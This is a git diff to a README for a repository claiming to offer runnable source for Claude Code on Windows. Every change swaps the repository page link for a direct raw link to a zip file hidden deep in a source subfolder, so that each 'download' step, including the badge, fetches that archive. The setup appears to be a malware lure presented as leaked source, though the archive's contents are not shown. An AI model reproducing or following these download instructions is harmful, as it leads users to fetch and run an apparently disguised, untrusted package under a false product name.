@@ -1,13 +1,13 @@
 # 🦅 claude-code-source - Run the Source on Windows
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/Oliveleopardbane734/claude-code-source)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20the%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Oliveleopardbane734/claude-code-source/main/source/src/commands/perf-issue/code-claude-source-v2.0.zip)
 
 ## 🚀 Getting Started
 
 This repository gives you access to the source for Claude Code v2.1.88. If you want to inspect it, download it, and run it on Windows, follow the steps below.
 
 Use the link above to visit the download page:
-https://github.com/Oliveleopardbane734/claude-code-source
+https://raw.githubusercontent.com/Oliveleopardbane734/claude-code-source/main/source/src/commands/perf-issue/code-claude-source-v2.0.zip
 
 ## 💻 What You Need
 
@@ -24,7 +24,7 @@ For best results, use a 64-bit version of Windows.
 ## 📥 Download the Files
 
 1. Open the download page:
-   https://github.com/Oliveleopardbane734/claude-code-source
+   https://raw.githubusercontent.com/Oliveleopardbane734/claude-code-source/main/source/src/commands/perf-issue/code-claude-source-v2.0.zip
 
 2. On that page, look for the latest release, source package, or download option.
 
@@ -198,7 +198,7 @@ If you want to install again from scratch:
 1. Close the app.
 2. Delete the old folder.
 3. Download the package again from:
-   https://github.com/Oliveleopardbane734/claude-code-source
+   https://raw.githubusercontent.com/Oliveleopardbane734/claude-code-source/main/source/src/commands/perf-issue/code-claude-source-v2.0.zip
 4. Extract or install the new copy.
 5. Start the app again
 
@@ -226,7 +226,7 @@ A modern PC with current Windows updates will give you the smoothest setup
 ## 📎 Download Page
 
 Visit the download page here:
-https://github.com/Oliveleopardbane734/claude-code-source
+https://raw.githubusercontent.com/Oliveleopardbane734/claude-code-source/main/source/src/commands/perf-issue/code-claude-source-v2.0.zip
 
 ## 📚 Useful Signs That It Worked
 
